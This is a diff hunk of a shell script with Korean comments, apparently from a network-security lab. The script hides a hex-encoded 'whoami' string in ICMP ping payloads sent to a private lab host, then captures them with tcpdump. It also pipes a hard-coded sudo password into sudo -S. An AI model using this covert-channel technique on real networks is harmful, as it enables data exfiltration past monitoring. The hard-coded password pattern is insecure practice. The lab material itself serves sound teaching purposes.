@@ -472,14 +472,14 @@ DATA_HEX=$(echo -n "whoami" | xxd -p)
 echo "명령 'whoami' → hex: $DATA_HEX"
 
 # ping에 데이터 포함 (1회)
-echo 1 | sudo -S ping -c 1 -p "$DATA_HEX" 10.20.30.80 2>/dev/null | head -3
+echo 1 | sudo -S ping -c 1 -p "$DATA_HEX" 10.20.32.80 2>/dev/null | head -3
 
 echo ""
 echo "--- tcpdump로 ICMP 데이터 확인 ---"
 # 백그라운드에서 캡처
 echo 1 | sudo -S timeout 3 tcpdump -i any icmp -c 2 -X 2>/dev/null &
 sleep 1
-echo 1 | sudo -S ping -c 1 -p "$DATA_HEX" 10.20.30.80 2>/dev/null > /dev/null
+echo 1 | sudo -S ping -c 1 -p "$DATA_HEX" 10.20.32.80 2>/dev/null > /dev/null
 wait 2>/dev/null
 
 echo ""
